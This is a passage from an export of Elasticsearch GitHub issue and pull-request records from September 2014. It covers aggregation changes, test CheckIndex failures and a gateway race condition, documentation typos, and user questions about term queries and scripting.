</comment><comment author="kimchy" created="2014-09-15T20:18:34Z" id="55651783">@bleskes I pushed removing the responses array, I think its ready
</comment><comment author="bleskes" created="2014-09-15T20:41:45Z" id="55655280">LGTM. The last change makes it cleaner imho. I'll add the BWC test tomorrow.
</comment><comment author="s1monw" created="2014-09-16T08:58:39Z" id="55714624">LGTM
</comment><comment author="martijnvg" created="2014-09-16T10:02:06Z" id="55721478">LGTM
</comment><comment author="kimchy" created="2014-09-22T13:11:54Z" id="56370049">pushed to 1.3.3 as well
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Aggregations: Removes isSingleUserCriteria check</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7728</link><project id="" key="" /><description>This change removes the backwards compatibility workaround that checks that a compoundOrder originated from a single user defined criteria for the purposes of serialising to older versioned nodes.
</description><key id="42786037">7728</key><summary>Aggregations: Removes isSingleUserCriteria check</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/colings86/following{/other_user}', u'events_url': u'https://api.github.com/users/colings86/events{/privacy}', u'organizations_url': u'https://api.github.com/users/colings86/orgs', u'url': u'https://api.github.com/users/colings86', u'gists_url': u'https://api.github.com/users/colings86/gists{/gist_id}', u'html_url': u'https://github.com/colings86', u'subscriptions_url': u'https://api.github.com/users/colings86/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/236731?v=4', u'repos_url': u'https://api.github.com/users/colings86/repos', u'received_events_url': u'https://api.github.com/users/colings86/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/colings86/starred{/owner}{/repo}', u'site_admin': False, u'login': u'colings86', u'type': u'User', u'id': 236731, u'followers_url': u'https://api.github.com/users/colings86/followers'}</assignee><reporter username="">colings86</reporter><labels /><created>2014-09-15T15:41:08Z</created><updated>2014-10-21T21:40:52Z</updated><resolved>2014-09-18T14:32:12Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="s1monw" created="2014-09-18T14:10:15Z" id="56043321">this is a master only change? if so LGTM
</comment><comment author="colings86" created="2014-09-18T14:20:04Z" id="56044760">@s1monw yes this is a master only change
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Support for arrays of numeric values in include/exclude clauses</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7727</link><project id="" key="" /><description>Changed terms and significant_terms aggregation to allow include/exclude values which are numerics.
Internally the IncludeExclude class now has a convertToLong/DoubleFilter method to convert the string representation of user criteria into a class with sets of primitive numerics used for fast evaluation of filters. 

Closes #7714 
</description><key id="42785988">7727</key><summary>Support for arrays of numeric values in include/exclude clauses</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">markharwood</reporter><labels><label>:Aggregations</label><label>enhancement</label><label>v1.5.0</label><label>v2.0.0-beta1</label></labels><created>2014-09-15T15:40:49Z</created><updated>2015-06-06T19:03:14Z</updated><resolved>2014-09-25T11:15:23Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="martijnvg" created="2014-09-24T14:23:41Z" id="56676986">Left a minor comment, other than that LGTM
</comment><comment author="markharwood" created="2014-09-24T16:49:46Z" id="56700788">Thanks for the review, @martijnvg 
I have removed the unused field, rebased and reran tests. 
Will push to 1.x and master if no objections
</comment><comment author="markharwood" created="2014-09-25T11:15:23Z" id="56804556">Pushed as https://github.com/elasticsearch/elasticsearch/commit/4f69a98ba75e236232dfb4ba3e548612dfe4859d
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Make sure channel closing never happens on i/o thread</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7726</link><project id="" key="" /><description>Similar to NettyTransport.doStop() all actions which disconnect
from a node (and thus call awaitUnterruptibly) should not be executed
on the I/O thread.

This patch ensures that all disconnects happen in the generic threadpool.

Also added a missing return statement in case the component was not yet
started when catching an exception on the netty layer.
</description><key id="42785143">7726</key><summary>Make sure channel closing never happens on i/o thread</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">javanna</reporter><labels><label>:Network</label><label>enhancement</label><label>v1.4.0.Beta1</label><label>v1.5.0</label><label>v2.0.0-beta1</label></labels><created>2014-09-15T15:33:08Z</created><updated>2015-06-07T16:31:50Z</updated><resolved>2014-09-15T16:00:10Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="kimchy" created="2014-09-15T15:38:25Z" id="55608767">LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Support for artificial documents in MLT query</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7725</link><project id="" key="" /><description>Previously, the only way to specify a document not present in the index was to
use `like_text`. This would usually lead to complex queries made of multiple
MLT queries per document field. This commit adds the ability to the MLT query
to directly specify documents not present in the index (artificial documents).
The syntax is similar to the Percolator API or to the Multi Term Vector API.
</description><key id="42776947">7725</key><summary>Support for artificial documents in MLT query</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">alexksikes</reporter><labels><label>:More Like This</label><label>feature</label><label>v1.5.0</label><label>v2.0.0-beta1</label></labels><created>2014-09-15T14:19:26Z</created><updated>2015-06-06T18:01:20Z</updated><resolved>2014-09-29T13:51:23Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="s1monw" created="2014-09-24T19:56:58Z" id="56728902">I left some minor comments looks good in general
</comment><comment author="s1monw" created="2014-09-29T13:03:37Z" id="57156911">LGTM thanks alex!!!
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Tests: always run CheckIndex on all shards created by the test</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7724</link><project id="" key="" /><description>Today we randomly CheckIndex 10% of the time, in MockFSDirectoryService.

Also (I think?), if the CheckIndex fails we don't fail the test; maybe there are known tests that create corrupted indices, but I think we should fail by default and then white list such tests?  We need to know if anything unexpectedly created corrupted indices ...
</description><key id="42774732">7724</key><summary>Tests: always run CheckIndex on all shards created by the test</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/mikemccand/following{/other_user}', u'events_url': u'https://api.github.com/users/mikemccand/events{/privacy}', u'organizations_url': u'https://api.github.com/users/mikemccand/orgs', u'url': u'https://api.github.com/users/mikemccand', u'gists_url': u'https://api.github.com/users/mikemccand/gists{/gist_id}', u'html_url': u'https://github.com/mikemccand', u'subscriptions_url': u'https://api.github.com/users/mikemccand/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/796508?v=4', u'repos_url': u'https://api.github.com/users/mikemccand/repos', u'received_events_url': u'https://api.github.com/users/mikemccand/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/mikemccand/starred{/owner}{/repo}', u'site_admin': False, u'login': u'mikemccand', u'type': u'User', u'id': 796508, u'followers_url': u'https://api.github.com/users/mikemccand/followers'}</assignee><reporter username="">mikemccand</reporter><labels><label>resiliency</label><label>test</label><label>v1.5.0</label><label>v2.0.0-beta1</label></labels><created>2014-09-15T13:57:09Z</created><updated>2014-10-17T07:23:28Z</updated><resolved>2014-10-17T07:23:28Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="rjernst" created="2014-09-15T15:37:04Z" id="55608573">+1
</comment><comment author="mikemccand" created="2014-09-25T20:53:36Z" id="56882248">Pushed.
</comment><comment author="mikemccand" created="2014-09-27T10:08:54Z" id="57048311">I had to back out this change: it was causing false failures.

Thanks to @mvg digging, it looks like there is a pre-existing bug
in ES somewhere, i.e. that while removing a shard
(IndexService.removeShard) is running, NoneIndexShardGateway.recover
is also allowed to concurrently go remove all files from the store.

AckTests shows the issue easily: just change "false" to "true" for
CHECK_INDEX_ON_CLOSE settings, and its tests will fail.  If I add
`.put("gateway.type", "local")` to AckTests.nodeSettings it fixes the
failures...

But I really have no idea where/how to fix this; seems like we need
some locking somewhere in NoneIndexShardGateway?  Somehow
LocalIndexShardGateway.recover doesn't have this issue...

Net/net I think it's very important that we pass CheckIndex for every
shard created in our tests: when we added this to Lucene's
MockDirectoryWrapper (long time ago...) it caught all sorts of
tricky cases where Lucene was [incorrectly!] making corrupt indices.
I just don't know how to proceed....
</comment><comment author="martijnvg" created="2014-09-30T07:56:37Z" id="57279216">When applying initializing shards on the actual data nodes the recovery happens in a async manner. In the integration tests the none gateway is used, which for "recovery" simply removes any existing files for shard being initialized. So for any create index or open index api call even if the response has been acked it doesn't mean recovery has been completed.

In AckTests#testOpenIndexNoAcknowledgement we create an index and then wait for green and then the created index gets closed and during close we run check index. So far no potential issues. The index gets opened and then the test tear down logic kicks in that deletes all the indices. This where there is a race condition. Because we don't wait for the acknowledgement and because the recovery from disk during the open index call is async, the deletion of all indices during teardown may run before / during the the recovery. When check index is ran the validation that there are actual files may pass, but when it actually starts verifying the index files they may already be removed.

I think there are two easy fixes for this:
- Stop using the none gateway in integration tests. The none gateway is used because the tests will run faster. The reason initializing shards get purged on the local node they get allocated is because of the none gateway. Local gateway (default) does't do this and actually recovers from disk.
- Waiting for a green state after the open index call this will make sure that the recovery that is triggered by the open call is invoked before we run check index that is caused by deleting all indices in the tear down.
</comment><comment author="mikemccand" created="2014-09-30T13:27:51Z" id="57312975">Thank you @martijnvg for getting to the bottom of this...

Is the "none" gateway used in practice, besides tests?  It is documented as being useful for indices that should not persist (http://www.elasticsearch.org/guide/en/elasticsearch/reference/current/modules-gateway.html ) but is it really used?  Maybe we could remove it entirely if not?  (Seems dangerous to remove only from tests if in fact users do use it...).

Might the "local" gateway also have problems, because its recover also runs concurrently with CheckIndex?
</comment><comment author="martijnvg" created="2014-09-30T14:07:00Z" id="57318692">I don't know of actual use cases for the none gateway, so I'm unsure if that is the right thing to do.
The local gateway does replay the translog and I think that isn't supposed to happen while check index runs? 
</comment><comment author="martijnvg" created="2014-10-17T07:23:28Z" id="59475884">Check index now always runs on the 1.x and master branch
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>[TEST] Minor  REST tests infra cleanup</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7723</link><project id="" key="" /><description>Make the http addresses within the REST client final. It makes no sense to update them before each test if we don't check the version of the nodes again, which would mean adding too much overhead (an additional http call before each test) for no reason. We just reuse the same nodes for the whole suite and check the version once while initializing the client. Would be nice to make the REST client within the execution context final but its initialization still needs to happen after the `ElasticsearchIntegrationTest#beforeInternal` that assigns `GLOBAL_CLUSTER` to `currentCluster`.
</description><key id="42770674">7723</key><summary>[TEST] Minor  REST tests infra cleanup</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">javanna</reporter><labels><label>test</label><label>v1.4.0.Beta1</label><label>v1.5.0</label><label>v2.0.0-beta1</label></labels><created>2014-09-15T13:14:18Z</created><updated>2014-10-21T21:40:52Z</updated><resolved>2014-09-15T13:30:46Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="s1monw" created="2014-09-15T13:15:01Z" id="55588034">LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Added scrollId/s setters to the different scroll requests/responses</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7722</link><project id="" key="" /><description /><key id="42760902">7722</key><summary>Added scrollId/s setters to the different scroll requests/responses</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">uboness</reporter><labels><label>:Internal</label><label>enhancement</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-09-15T10:59:36Z</created><updated>2015-06-07T12:02:41Z</updated><resolved>2014-09-15T11:41:24Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="kimchy" created="2014-09-15T11:09:12Z" id="55576852">LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Only set `breaker` when stats are retrieved</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7721</link><project id="" key="" /><description>When communicating with 1.3 and earlier nodes, it's possible that the
field data breaker info is not sent at all. When this happens, we should
leave the `breaker` variable as-is (unset) instead of creating an
AllCircuitBreakerStats object with a null fd breaker and fake request &amp;
parent breakers.
</description><key id="42757217">7721</key><summary>Only set `breaker` when stats are retrieved</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">dakrone</reporter><labels><label>:Circuit Breakers</label><label>bug</label><label>v1.4.0.Beta1</label><label>v1.5.0</label><label>v2.0.0-beta1</label></labels><created>2014-09-15T10:04:49Z</created><updated>2015-06-07T17:56:06Z</updated><resolved>2014-09-15T10:35:19Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="dakrone" created="2014-09-15T10:26:03Z" id="55573423">Added a BWC test to this.
</comment><comment author="s1monw" created="2014-09-15T10:26:30Z" id="55573455">LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Fold two hashFile implemenation into one</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7720</link><project id="" key="" /><description>simple refactoring to remove code duplication
</description><key id="42755338">7720</key><summary>Fold two hashFile implemenation into one</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">s1monw</reporter><labels><label>:Store</label><label>enhancement</label><label>v1.5.0</label><label>v2.0.0-beta1</label></labels><created>2014-09-15T09:38:56Z</created><updated>2015-06-07T17:37:16Z</updated><resolved>2014-09-16T09:04:48Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="rjernst" created="2014-09-15T15:43:29Z" id="55609512">LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>UnicastZenPing - use temporary node ids if can't resolve node by it's address</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7719</link><project id="" key="" /><description>The Unicast Zen Ping mechanism is configured to ping certain host:port combinations in order to discover other node. Since this is only a ping, we do not setup a full connection but rather do a light connect with one channel. This light connection is closed at the end of the pinging.

During pinging, we may discover disco nodes which are not yet connected (via temporalResponses). UnicastZenPing will setup the same light connection for those node. However, during pinging a cluster state may arrive with those nodes in it. In that case , we will mistakenly believe those nodes are connected and at the end of pinging we will mistakenly disconnect those valid node.

This commit makes sure that all nodes UnicastZenPing connects to have a unique id and can be safely disconnected.
</description><key id="42748360">7719</key><summary>UnicastZenPing - use temporary node ids if can't resolve node by it's address</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">bleskes</reporter><labels><label>:Discovery</label><label>bug</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-09-15T07:53:25Z</created><updated>2015-06-07T18:44:43Z</updated><resolved>2014-09-15T14:48:19Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments /><attachments /><subtasks /><customfields /></item><item><title>Not all master election related cluster state update task use Priority.IMMEDIATE</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7718</link><project id="" key="" /><description>Most notably the elected_as_master task should run as soon as possible. This is an issue as node join request do use `Priority.IMMEDIATE` and can be unjustly rejected.
</description><key id="42748230">7718</key><summary>Not all master election related cluster state update task use Priority.IMMEDIATE</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">bleskes</reporter><labels><label>:Discovery</label><label>enhancement</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-09-15T07:50:58Z</created><updated>2015-06-07T12:02:51Z</updated><resolved>2014-09-15T19:28:14Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="martijnvg" created="2014-09-15T07:51:39Z" id="55561102">LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Remove unneeded waits on recovery cancellation</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7717</link><project id="" key="" /><description>When cancelling recoveries, we wait for up to 10s for the source node to be notified before continuing. This is not needed in two cases:
1) The source node has been disconnected due to node shutdown (recovery is canceled as a response to cluster state processing)
2) The current thread is the one that will be notifying the source node  (happens when when of the calls from the source nodes discoveres local index is closed)

The first one is especially important as it may delay cluster state update processing with 10s.
</description><key id="42748139">7717</key><summary>Remove unneeded waits on recovery cancellation</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">bleskes</reporter><labels><label>:Recovery</label><label>enhancement</label><label>resiliency</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-09-15T07:49:22Z</created><updated>2015-06-07T12:03:00Z</updated><resolved>2014-09-15T13:31:20Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="kimchy" created="2014-09-15T13:18:53Z" id="55588471">LGTM, minor comment
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>find all index-types (i.e. tables/collection ) within index (database) in elastic search using js api</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7716</link><project id="" key="" /><description>I want to find all types of an Index in elastic search, I have search for this , and I have found, it is possible through getMapping , but getMapping gives data-types as well as types of index , but I want to get only available types of an Index, if there is any way to get this only , please suggest,

Thanks in advance...
</description><key id="42746816">7716</key><summary>find all index-types (i.e. tables/collection ) within index (database) in elastic search using js api</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">rajit-daffodil</reporter><labels /><created>2014-09-15T07:22:44Z</created><updated>2014-09-24T18:32:12Z</updated><resolved>2014-09-24T18:32:12Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-09-24T18:32:12Z" id="56716934">Hi @rajit-daffodil 

Please use the forum for questions like these. The github issues list is for bugs and feature requests.

thanks
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Term queries with a forward slash in the term do not work as expected</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7715</link><project id="" key="" /><description>If I have a document like 

{
_index: captora.com
_type: contentdiscovery
_id: GfUbzwEoTkmnWVO__jzlog
_score: 12.953745
_source: {
image: http://campaign.com/image1.png
subtitle: 
description: sample description
campaign: campaign name
title: Title of Campaign
assettype: 
url: http://www.campaign.com
}
}

and I try a term query with payload like 

{
  "query": {
    "term": {
      "url": "http://www.campaign.com"
    }
  },
  "from": 0,
  "size": 9999
}

I get 0 results while the url is exactly as in the document. While a query without http:// in the term returns the document. i.e.

{
  "query": {
    "term": {
      "url": "www.campaign.com"
    }
  },
  "from": 0,
  "size": 9999
}
</description><key id="42682924">7715</key><summary>Term queries with a forward slash in the term do not work as expected</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">chandra9</reporter><labels /><created>2014-09-13T00:43:32Z</created><updated>2014-09-13T01:00:14Z</updated><resolved>2014-09-13T01:00:14Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="chandra9" created="2014-09-13T00:45:42Z" id="55476439">Forgot to mention, the url field is stored and not analyzed.
</comment><comment author="chandra9" created="2014-09-13T01:00:14Z" id="55476959">Figured out the problem, we had a client side analyzer in the chain. Thanks!
I'll use the forum the next time :tongue: 
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Aggs: filtering values using array of values, including numeric values</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7714</link><project id="" key="" /><description>In facets, we can filter a Terms Facet using an [array of values](http://www.elasticsearch.org/guide/en/elasticsearch/reference/current/search-facets-terms-facet.html#_excluding_terms), including numeric values:

``` json
{
    "query" : {
        "match_all" : { }
    },
    "facets" : {
        "tag" : {
            "terms" : {
                "field" : "tag_id",
                "exclude" : [101, 202]
            }
        }
    }
}
```

This cannot be achieved with the regular expression support in the current exclude syntax as it only support string fields.  Some excellent work was done on #6782 to support string terms arrays but this complementary feature for numeric arrays is still missing.

There's a more detailed description in [this email thread](https://groups.google.com/forum/?utm_medium=email&amp;utm_source=footer#!msg/elasticsearch/8g74ov0run0/yLfGwVF7WVgJ) including a [curl gist test case](https://gist.github.com/nezda/60932c73a8485e9d9a49).

cc @micpalmia 
</description><key id="42644686">7714</key><summary>Aggs: filtering values using array of values, including numeric values</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/markharwood/following{/other_user}', u'events_url': u'https://api.github.com/users/markharwood/events{/privacy}', u'organizations_url': u'https://api.github.com/users/markharwood/orgs', u'url': u'https://api.github.com/users/markharwood', u'gists_url': u'https://api.github.com/users/markharwood/gists{/gist_id}', u'html_url': u'https://github.com/markharwood', u'subscriptions_url': u'https://api.github.com/users/markharwood/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/170925?v=4', u'repos_url': u'https://api.github.com/users/markharwood/repos', u'received_events_url': u'https://api.github.com/users/markharwood/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/markharwood/starred{/owner}{/repo}', u'site_admin': False, u'login': u'markharwood', u'type': u'User', u'id': 170925, u'followers_url': u'https://api.github.com/users/markharwood/followers'}</assignee><reporter username="">nezda</reporter><labels><label>enhancement</label></labels><created>2014-09-12T16:08:56Z</created><updated>2014-12-05T02:59:26Z</updated><resolved>2014-09-25T10:31:44Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="jplehmann" created="2014-09-12T16:42:44Z" id="55429344">+1
</comment><comment author="gcarothers" created="2014-09-12T17:12:06Z" id="55433210">Thanks @nezda for pointing this out. I'd thought this was taken care of in #6782, seems odd that it only works for some types.
</comment><comment author="micpalmia" created="2014-09-12T17:15:29Z" id="55433634">thank you @nezda 
obviously +1
</comment><comment author="nezda" created="2014-12-05T02:59:26Z" id="65741126">When will this be released?
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>[DOC] Range filter docs</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7713</link><project id="" key="" /><description>The [Range Filter](http://www.elasticsearch.org/guide/en/elasticsearch/reference/current/query-dsl-range-filter.html#_execution) docs seem to contain some typos and some words fell out over the balcony in the _execution_ section:

---

&lt;table&gt;
&lt;tr&gt;
&lt;td&gt;index&lt;/td&gt;
&lt;td&gt;Uses field&#8217;s inverted &lt;ins&gt;_something_missing_here?_&lt;/ins&gt; in order to determine &lt;del&gt;of&lt;/del&gt; &lt;ins&gt;if&lt;/ins&gt; documents fall with in the range filter&#8217;s from and to range&lt;ins&gt;.&lt;/ins&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;fielddata&lt;/td&gt;
&lt;td&gt;Uses field data in order to determine &lt;del&gt;of&lt;/del&gt; &lt;ins&gt;if&lt;/ins&gt; documents fall with in the range filter&#8217;s from and to range.&lt;/td&gt;
&lt;/tr&gt;
&lt;/table&gt;


[...]

The `fielddata` execution as the &lt;del&gt;same&lt;/del&gt; &lt;ins&gt;name&lt;/ins&gt; suggests uses field data [...]

---

It seems these issues are spread from `0.90` docs (did not check earlier versions) all the way up to the `master`.
</description><key id="42641955">7713</key><summary>[DOC] Range filter docs</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">lukas-vlcek</reporter><labels><label>adoptme</label><label>bug</label><label>docs</label></labels><created>2014-09-12T15:40:38Z</created><updated>2014-10-03T07:31:01Z</updated><resolved>2014-09-24T18:20:31Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="lukas-vlcek" created="2014-09-26T03:19:10Z" id="56914965">@clintongormley I think there are still two typos left. Both `index` and `fielddata` details read: _[...] in order to determine of documents fall [...]_. Should the `of` be `if`?
</comment><comment author="clintongormley" created="2014-09-30T17:29:01Z" id="57350390">@lukas-vlcek thanks, i'll fix. it'd be a lot easier both for reporting and fixing if you clicked on the edit link and sent a PR instead :)
</comment><comment author="lukas-vlcek" created="2014-09-30T18:56:45Z" id="57364039">@clintongormley what I do not understand is how are PR related to various guide versions. Are changes in master propagated to different versions (0.90 for example) too?
</comment><comment author="clintongormley" created="2014-10-03T07:31:01Z" id="57764452">@lukas-vlcek if you send a PR against the "current" version of the docs (which is what happens when you click the edit button on the docs), then we will apply it to the relevant branches.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Missing doc.score documentation</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7712</link><project id="" key="" /><description>I found the variable doc.score very useful but then it don't have documentation in http://www.elasticsearch.org/guide/en/elasticsearch/reference/current/modules-scripting.html , but it has documentation in http://www.elasticsearch.cn/guide/reference/modules/scripting.html .

Kindly add this information.
</description><key id="42641876">7712</key><summary>Missing doc.score documentation</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">Vineeth-Mohan</reporter><labels /><created>2014-09-12T15:39:47Z</created><updated>2014-09-29T15:39:35Z</updated><resolved>2014-09-22T11:44:23Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="colings86" created="2014-09-22T11:44:23Z" id="56361479">The score for the current document can be accessed by a script using the _score variable which is equivalent to doc.score. This is the preferred way of accessing the score and is documented at http://www.elasticsearch.org/guide/en/elasticsearch/reference/current/modules-scripting.html#_score
</comment><comment author="Vineeth-Mohan" created="2014-09-22T11:54:13Z" id="56362343">Hello @colings86 

ES script - 1.3.2

I  am not able to access this field in aggs scripts - 
{
  "aggs": {
    "sum": {
      "sum": {
        "script": "doc.score"
      }
    }
  }
}

Works

{
  "aggs": {
    "sum": {
      "sum": {
        "script": "_score"
      }
    }
  }
}

gives - QueryPhaseExecutionException[[twitter][2]: query[ConstantScore(_:_)],from[0],size[10]: Query Failed [Failed to execute main query]]; nested: PropertyAccessException[[Error: unresolvable property or identifier: _score] [Near : {... _score ....}] ^ [Line: 1, Column: 1]];
</comment><comment author="clintongormley" created="2014-09-29T15:39:35Z" id="57180264">@Vineeth-Mohan it works in groovy, not mvel (which is deprecated)
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Make sure that original headers are used when executing search as part of put warmer</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7711</link><project id="" key="" /><description /><key id="42640979">7711</key><summary>Make sure that original headers are used when executing search as part of put warmer</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">javanna</reporter><labels><label>:Internal</label><label>enhancement</label><label>v1.4.0.Beta1</label><label>v1.5.0</label><label>v2.0.0-beta1</label></labels><created>2014-09-12T15:30:41Z</created><updated>2015-06-07T10:33:46Z</updated><resolved>2014-09-15T07:36:26Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="rjernst" created="2014-09-13T00:44:31Z" id="55476400">LGTM.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>[TEST] Expose ability to provide http headers when sending requests in our REST tests</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7710</link><project id="" key="" /><description>`ElasticsearchRestTests` has now a `restClientSettings` method that can be overriden to provide headers as settings (similarly to what we do with transport client). Those headers will be sent together with every REST requests within the tests.
</description><key id="42639229">7710</key><summary>[TEST] Expose ability to provide http headers when sending requests in our REST tests</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">javanna</reporter><labels><label>test</label><label>v1.4.0.Beta1</label><label>v1.5.0</label><label>v2.0.0-beta1</label></labels><created>2014-09-12T15:13:46Z</created><updated>2014-09-15T07:58:03Z</updated><resolved>2014-09-15T07:31:39Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="rjernst" created="2014-09-13T00:50:06Z" id="55476607">Looks fine.  Left one minor comment.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>field name lookup: return List instead of Set for names matching a patte...</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7709</link><project id="" key="" /><description>...rn

The returned sets are only used for iterating. Therefore we might
as well return a list since this guaratees order.

This is the same effect as in
https://github.com/elasticsearch/elasticsearch/pull/7698
The test SimpleIndexQueryParserTests#testQueryStringFieldsMatch
failed on openjdk 1.7.0_65 with
&lt;jdk.map.althashing.threshold&gt;0&lt;/jdk.map.althashing.threshold&gt;
